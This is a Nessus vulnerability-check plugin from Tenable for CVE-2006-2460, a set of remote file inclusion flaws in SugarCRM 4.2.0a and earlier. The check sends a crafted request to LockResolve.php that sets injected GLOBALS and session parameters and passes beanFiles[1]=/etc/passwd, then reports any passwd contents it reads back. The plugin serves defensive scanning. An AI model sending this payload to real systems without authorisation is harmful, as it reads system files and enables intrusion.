#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple remote file inclusion issues. 

Description :

The version of SugarCRM installed on the remote host fails to sanitize
input to various parameters and scripts before using it to include PHP
code from other files.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit these
issues to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://retrogod.altervista.org/sugar_suite_42_incl_xpl.html
http://www.securityfocus.com/archive/1/434009/30/0/threaded
http://www.sugarcrm.com/forums/showthread.php?t=12282

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21570);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-2460");
  script_bugtraq_id(17987);
  script_xref(name:"OSVDB", value:"25532");

  script_name(english:"SugarCRM <= 4.2.0a Multiple Remote File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file using SugarCRM");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("sugarcrm_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/sugarcrm"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/modules/OptimisticLock/LockResolve.php?",
      "GLOBALS[sugarEntry]=1&",
      "_SESSION[o_lock_object]=1&",
      "_SESSION[o_lock_module]=1&",
      "beanList[1]=1&",
      "beanFiles[1]=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (isnull(contents)) report = desc;
    else 
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
